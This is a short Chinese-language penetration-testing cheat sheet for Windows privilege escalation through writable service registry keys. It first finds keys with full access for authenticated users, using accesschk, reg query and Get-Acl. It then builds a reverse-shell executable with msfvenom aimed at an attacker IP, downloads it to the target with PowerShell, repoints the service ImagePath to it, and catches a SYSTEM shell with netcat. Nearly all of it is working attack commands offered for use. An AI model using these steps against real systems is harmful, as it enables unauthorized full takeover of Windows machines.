	检查有KEY_ALL_ACCESS权限的注册表项
	>accesschk.exe /accepteula "authenticated users" -kvuqsw hklm\System\CurrentControlSet\services
	查询路径
	>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xxxx
	使用powershell查询
	>Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\xxxx | fl
	可以看到authenticated users ALLOW FullControl
	攻击
	>msfvenom –p window/shell_reverse_tcp lhost=192.168.1.3 lport=8888 –f exe > shell.exe
	>python –m SimpleHTTPServer 80
	>cd c:\Users\public
	>powershell wget http://192.168.1.3/shell.exe -o shell.exe
	>dir
	>reg add "HKLM\system\currentcontrolset\services\xxxx" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Public\shell.exe" /f
	>net start pentest
	攻击机监听获得system权限会话
	>nc -lvp 8888